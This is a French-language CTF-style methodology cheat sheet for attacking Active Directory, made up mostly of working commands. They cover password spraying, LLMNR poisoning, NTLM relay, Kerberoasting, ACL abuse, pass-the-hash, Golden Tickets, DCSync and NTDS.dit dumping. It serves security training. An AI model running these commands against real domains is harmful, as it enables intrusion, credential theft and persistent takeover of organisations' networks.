# 🏢 Méthodologie d’attaque Active Directory

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
    █████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
   ███████║██║  ██║   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
   ██╔══██║██║  ██║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
   ██║  ██║██████╔╝   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═╝  ╚═╝╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         Guide étape par étape du compte utilisateur à l’administration du domaine
```

<p align="center">
  <img src="https://img.shields.io/badge/AD-Methodology-red?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/CTF-Guide-blue?style=for-the-badge" alt="CTF">
  <img src="https://img.shields.io/badge/Domain_Admin-green?style=for-the-badge" alt="DA">
</p>

---

<a id="-vue-densemble-du-parcours-dattaque"></a>
## 🗺️ Vue d’ensemble du parcours d’attaque

> **Contexte :** ce parcours est schématique, pas une progression garantie vers Domain Admin. Les blocs mêlent commandes Linux, Windows, PowerShell et requêtes ; les libellés de langage ne déterminent pas où les exécuter. Les droits, la configuration et les versions des outils restent déterminants. Les noms historiques et les valeurs d’exemple sont conservés.

```
┌───────────────────────────────────────────────────────────────────────────────────────────────────┐
│                              MÉTHODOLOGIE D’ATTAQUE ACTIVE DIRECTORY                              │
├───────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                   │
│ PHASE 1 : Énumération            PHASE 2 : Accès initial          PHASE 3 : Élévation de droits   │
│ ├── Analyse réseau               ├── Password spraying            ├── Kerberoasting               │
│ ├── Énumération LDAP             ├── Empoisonnement LLMNR         ├── AS-REP Roasting             │
│ ├── Énumération des comptes      └── Relais NTLM                  └── Abus des ACL                │
│ └── BloodHound                                                                                    │
│                                                                                                   │
│ PHASE 4 : Déplacement latéral    PHASE 5 : Persistance            PHASE 6 : Contrôle du domaine   │
│ ├── Pass-the-Hash                ├── Golden Ticket                ├── DCSync                      │
│ ├── WinRM/PSExec                 ├── Silver Ticket                ├── NTDS.dit                    │
│ └── Exécution WMI                └── Skeleton Key                 └── Contrôle total              │
│                                                                                                   │
└───────────────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 Table des matières

- [Vue d’ensemble du parcours d’attaque](#-vue-densemble-du-parcours-dattaque)
- [Phase 1 : énumération](#-phase-1--énumération)
- [Phase 2 : accès initial](#-phase-2--accès-initial)
- [Phase 3 : élévation de privilèges](#-phase-3--élévation-de-privilèges)
- [Phase 4 : déplacement latéral](#-phase-4--déplacement-latéral)
- [Phase 5 : persistance](#-phase-5--persistance)
- [Phase 6 : contrôle du domaine](#-phase-6--contrôle-du-domaine)
- [Référence rapide des commandes](#-référence-rapide-des-commandes)
- [Conseils pour les CTF](#-conseils-pour-les-ctf)
- [Aide-mémoire associés](#-aide-mémoire-associés)

---

## 🔍 Phase 1 : énumération

L’énumération inventorie le domaine, ses comptes et ses services. Un contrôleur de domaine est un *domain controller* (DC). Les fonctions PowerView sont fournies par un module externe, pas par PowerShell seul.

### 1.1 Découverte du réseau

```bash
# Rechercher les contrôleurs de domaine
nmap -p 53,88,389,636,445 10.10.10.0/24

# Identifier les services AD
nmap -p 88,135,139,389,445,464,636,3268,3269 -sV 10.10.10.10
```

**Ports principaux :**
| Port | Service | Fonction |
|------|---------|---------|
| 53 | DNS | Résolution des noms de domaine |
| 88 | Kerberos | Authentification |
| 389 | LDAP | Annuaire |
| 445 | SMB | Partages de fichiers |
| 636 | LDAPS | LDAP sécurisé |
| 5985 | WinRM | Administration à distance |

### 1.2 Énumération anonyme (sans identifiants)

```bash
# Session RPC nulle
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# Connexion LDAP anonyme
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"

# Enum4linux
enum4linux -a 10.10.10.10

# Énumération des utilisateurs avec Kerbrute (sans identifiants)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```

### 1.3 Avec des identifiants valides

```bash
# Obtenir des informations sur le domaine
crackmapexec smb 10.10.10.10 -u user -p password --users
crackmapexec smb 10.10.10.10 -u user -p password --groups
crackmapexec smb 10.10.10.10 -u user -p password --shares

# Énumération LDAP
ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10
```

### 1.4 Énumération avec PowerView

```powershell
# Importer PowerView
Import-Module .\PowerView.ps1

# Informations sur le domaine
Get-Domain
Get-DomainController

# Rechercher des cibles intéressantes
Get-DomainUser -SPN                    # Exposé au Kerberoasting
Get-DomainUser -PreauthNotRequired      # Exposé à AS-REP Roasting
Get-DomainComputer -Unconstrained       # Délégation

# Rechercher les sessions des administrateurs du domaine (DA)
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

### 1.5 Collecte pour BloodHound

> **Version des exemples :** BloodHound.py distingue Legacy et Community Edition ; collecteur, données et schéma des requêtes doivent correspondre. Les commentaires `#` dans le bloc Cypher sont des annotations du guide. La requête DCSync originale retourne aussi des droits isolés : il faut la combinaison GetChanges et GetChangesAll, et non l’un des deux seulement ([collecteur officiel](https://github.com/dirkjanm/BloodHound.py), [DCSync](https://bloodhound.specterops.io/resources/edges/dc-sync)).

```bash
# Depuis Linux (bloodhound-python)
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All

# Depuis Windows (SharpHound)
.\SharpHound.exe -c All
```

**Requêtes BloodHound :**
```cypher
# Chemin le plus court vers les administrateurs du domaine
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Utilisateurs exposés au Kerberoasting
MATCH (u:User {hasspn:true}) RETURN u.name

# Utilisateurs disposant de droits DCSync
MATCH (u:User)-[:DCSync|:GetChanges|:GetChangesAll]->(d:Domain) RETURN u.name
```

---

## 🔑 Phase 2 : accès initial

### 2.1 Essais d’un même mot de passe sur plusieurs comptes (password spraying)

```bash
# Password spraying avec CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

# Password spraying avec Kerbrute
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'
```

**Mots de passe courants :**

Les motifs anglais et les chaînes ci-dessous restent inchangés : saison suivie de l’année, ou nom d’entreprise suivi de chiffres. Ce sont des exemples historiques.
```
Season+Year: Summer2024!, Winter2024
CompanyName+123: Company123!
Welcome1, Password1
```

### 2.2 Empoisonnement LLMNR/NBT-NS

> **Précision :** les réponses NTLMv2 capturées sont des échanges défi-réponse, pas directement l’empreinte NT utilisée par les exemples Pass-the-Hash. Les captures et les résultats de recherche de mots de passe ne sont pas garantis ; `5600` correspond au format NetNTLMv2 ([formats Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)).

```bash
# Terminal 1 : lancer Responder
sudo responder -I eth0 -wPv

# Attendre les réponses d’authentification…
# NTLMv2 capturé !

# Terminal 2 : rechercher le mot de passe
hashcat -m 5600 hash.txt rockyou.txt
```

### 2.3 Relais NTLM

> **Précision :** la signature SMB fait partie des protections qui limitent les relais ; les conditions diffèrent selon les protocoles. Le commentaire « SMB désactivé » suppose une configuration de Responder que la seule commande ne définit pas : le serveur SMB est activé dans sa configuration de référence. Les exemples ne constituent donc pas une configuration complète ([Microsoft](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview), [configuration Responder](https://github.com/lgandx/Responder/blob/master/Responder.conf)).

```bash
# Rechercher les cibles sans signature SMB
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Responder (SMB désactivé)
sudo responder -I eth0

# Attaque par relais
impacket-ntlmrelayx -tf relay.txt -smb2support
```

### 2.4 AS-REP Roasting (sans mot de passe requis dans ce cas)

> **Précision :** l’absence de mot de passe n’est possible ici que pour des comptes sans préauthentification Kerberos. Les fichiers `asrep.txt` et `kerberoast.txt` utilisés ensuite ne sont pas automatiquement créés par les commandes affichées. Les modes `18200` et `13100` visent des formats Kerberos et types de chiffrement précis, notamment etype 23 ; ils ne couvrent pas tous les tickets ([GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py), [GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py), [Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)).

```bash
# Rechercher les utilisateurs concernés
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Ou avec des identifiants
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Rechercher le mot de passe
hashcat -m 18200 asrep.txt rockyou.txt
```

---

<a id="-phase-3--élévation-de-privilèges"></a>
## ⬆️ Phase 3 : élévation de privilèges

### 3.1 Kerberoasting

Le *Kerberoasting* exploite des tickets de service pour tenter de retrouver un mot de passe hors ligne ; un SPN est un nom principal de service. Une ACL décrit les permissions accordées aux objets.

```bash
# Depuis Linux
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Depuis Windows
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Rechercher le mot de passe
hashcat -m 13100 kerberoast.txt rockyou.txt
```

### 3.2 Abus des listes de contrôle d’accès (ACL)

**GenericAll sur un utilisateur :**
```powershell
# Modifier le mot de passe
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

**GenericAll sur un groupe :**
```powershell
# Ajouter son compte au groupe
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

**GenericWrite :**
```powershell
# Définir un SPN pour le Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='any/thing'}
```

**WriteDACL :**
```powershell
# Accorder des droits DCSync à son compte
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

### 3.3 Attaques sur la délégation

> **Précision :** les exemples supposent les droits et conditions de délégation appropriés. Créer une machine dépend aussi des autorisations et quotas ; les noms de comptes machine et leur suffixe `$` doivent correspondre aux objets réels. Les noms FAKE01/TARGET du bloc sont schématiques, sans garantir une chaîne RBCD fonctionnelle ([addcomputer](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py), [rbcd](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)).

**Délégation non contrainte (Unconstrained Delegation) :**
```powershell
# Rechercher les cibles
Get-DomainComputer -Unconstrained

# Surveiller les tickets TGT
.\Rubeus.exe monitor /interval:5 /targetuser:DC$

# Déclenchement (PrinterBug)
SpoolSample.exe DC01 YOURHOST
```

**Délégation contrainte (Constrained Delegation) :**
```bash
# Demander un ticket
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/serviceaccount:password -dc-ip 10.10.10.10

# Utiliser le ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

**Délégation contrainte fondée sur la ressource (RBCD) :**
```bash
# Créer un compte de machine
addcomputer.py -computer-name FAKE01 -computer-pass 'Password123!' domain.local/user:password

# Configurer la RBCD
rbcd.py -delegate-from FAKE01 -delegate-to TARGET -action write domain.local/user:password

# Obtenir un ticket
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE01:'Password123!'
```

---

<a id="-phase-4--déplacement-latéral"></a>
## ➡️ Phase 4 : déplacement latéral

### 4.1 Pass-the-Hash

Le *Pass-the-Hash* utilise une empreinte NT plutôt que le mot de passe en clair, lorsque le service et les droits permettent cette authentification. Un TGT est un ticket permettant de demander des tickets de service.

```bash
# PSExec avec une empreinte
impacket-psexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# WMIExec
impacket-wmiexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# SMBExec
impacket-smbexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# CrackMapExec
crackmapexec smb 10.10.10.10 -u admin -H NTLMHASH -x "whoami"
```

### 4.2 Pass-the-Ticket

> **Précision :** les tickets et caches des outils ne sont pas tous interchangeables. Les exemples Rubeus et ccache supposent le format, les clés et les droits adaptés ; l’usage de RC4 dans les autres blocs dépend aussi de la politique Kerberos ([Rubeus](https://github.com/GhostPack/Rubeus), [Kerberos Microsoft](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)).

```bash
# Exporter le ticket
.\Rubeus.exe dump

# Utiliser le ticket sous Linux
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/admin@target

# Utiliser le ticket sous Windows
.\Rubeus.exe ptt /ticket:base64ticket
```

### 4.3 WinRM

```bash
# Evil-WinRM avec un mot de passe
evil-winrm -i 10.10.10.10 -u admin -p password

# Avec une empreinte
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH
```

### 4.4 Overpass-the-Hash

```bash
# Obtenir un TGT avec une empreinte
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Utiliser ensuite Kerberos
dir \\server\share
```

---

## 🔒 Phase 5 : persistance

### 5.1 Golden Ticket

> **Précision :** Golden Ticket et Silver Ticket désignent des tickets forgés à partir de secrets déjà compromis ; leur portée dépend du service, des clés, de la validation et des correctifs. Le SID tronqué et les empreintes en majuscules sont des placeholders, pas des valeurs utilisables ([documentation Rubeus](https://github.com/GhostPack/Rubeus)).

```bash
# Prérequis : empreinte NTLM de krbtgt + SID du domaine

# Créer le ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator

# Utiliser le ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

```powershell
# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

### 5.2 Silver Ticket

```bash
# Créer un ticket de service
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
```

### 5.3 Accès persistant par des droits DCSync

```powershell
# Ajouter des droits DCSync à un utilisateur
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdooruser -Rights DCSync
```

---

## 👑 Phase 6 : contrôle du domaine

### 6.1 DCSync

> **Précision :** disposer d’identifiants ne suffit pas pour DCSync : les droits de réplication nécessaires doivent être effectifs. Les commandes d’extraction et de clichés de la section suivante exigent également les accès appropriés ; le numéro du cliché est un exemple ([droits DCSync](https://bloodhound.specterops.io/resources/edges/dc-sync)).

```bash
# Extraire toutes les empreintes
impacket-secretsdump domain.local/admin:password@10.10.10.10

# Avec une empreinte
impacket-secretsdump -hashes :NTLMHASH domain.local/admin@10.10.10.10

# Utilisateur précis
impacket-secretsdump domain.local/admin:password@10.10.10.10 -just-dc-user administrator
```

### 6.2 Extraction de NTDS.dit

```bash
# Créer un cliché instantané
vssadmin create shadow /for=C:

# Copier NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# Extraire hors ligne
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### 6.3 Extraction avec CrackMapExec

```bash
# Extraire NTDS par DCSync
crackmapexec smb DC01 -u admin -p password --ntds
```

---

## 📊 Référence rapide des commandes

### Énumération en une ligne

```bash
# Rechercher les contrôleurs de domaine
nmap -p 88,389 --open 10.10.10.0/24

# Énumérer les utilisateurs sans identifiants
kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/wordlists/names.txt

# Rechercher les comptes exposés à AS-REP Roasting
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# Kerberoasting
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
```

### Tableau des attaques

| Attaque | Commande |
|--------|---------|
| Password spraying | `crackmapexec smb DC -u users.txt -p 'Pass123!'` |
| AS-REP Roast | `GetNPUsers.py domain.local/ -usersfile u.txt -dc-ip DC` |
| Kerberoast | `GetUserSPNs.py domain.local/u:p -dc-ip DC -request` |
| DCSync | `secretsdump.py domain.local/admin:pass@DC` |
| Pass-the-Hash | `psexec.py -hashes :HASH domain.local/admin@target` |
| Golden Ticket | `ticketer.py -nthash KRBTGT -domain-sid SID -domain domain.local admin` |

### Recherche de mots de passe à partir des empreintes

| Type d’empreinte | Mode Hashcat |
|-----------|--------------|
| NTLM | `-m 1000` |
| NTLMv2 | `-m 5600` |
| Kerberoast | `-m 13100` |
| AS-REP | `-m 18200` |

---

## 🎯 Conseils pour les CTF

1. **Toujours commencer par l’énumération** — Éviter les tentatives à l’aveugle
2. **Rechercher les comptes exposés à AS-REP Roasting** — Des données peuvent être obtenues sans identifiants, sous conditions
3. **Utiliser BloodHound** — Repérer les parcours d’attaque
4. **Examiner les ACL** — Leurs permissions sont parfois mal configurées
5. **Examiner la délégation** — Rechercher des configurations exploitables
6. **Procéder prudemment avec le password spraying** — Risque de verrouillage des comptes
7. **Conserver les identifiants recueillis** — Ils seront utiles pour la suite

---

## 📚 Aide-mémoire associés

- [BloodHound](../../BloodHound/translations/README.fr.md)
- [Impacket](../../Impacket/translations/README.fr.md)
- [CrackMapExec](../../CrackMapExec/README.md)
- [Rubeus](../../Rubeus/README.md)
- [PowerView](../../PowerView/README.md)
- [Responder](../../Responder/README.md)
- [Evil-WinRM](../../Evil-WinRM/README.md)
- [Mimikatz](../../Mimikatz/translations/README.fr.md)

---

<p align="center">
  <b>🏢 Du compte utilisateur à l’administration du domaine !</b><br>
  <i>Suivre la méthodologie pour comprendre les chemins de compromission du domaine</i>
</p>
